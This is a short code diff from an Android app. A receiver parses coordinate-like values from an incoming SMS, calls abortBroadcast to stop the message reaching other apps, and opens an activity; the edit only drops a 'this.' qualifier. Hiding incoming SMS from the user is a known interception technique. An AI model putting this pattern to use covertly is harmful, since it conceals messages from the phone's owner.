@@ -39,7 +39,7 @@ public class Boot_Receiver extends BroadcastReceiver {
                             body.indexOf("|", body.indexOf("|") + 1));
                     String[] tmp = point.split(",");
                     
-                    this.abortBroadcast();
+                    abortBroadcast();
                     Intent it = new Intent();
                     it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     it.setClass(context, GetSMSActivity.class);
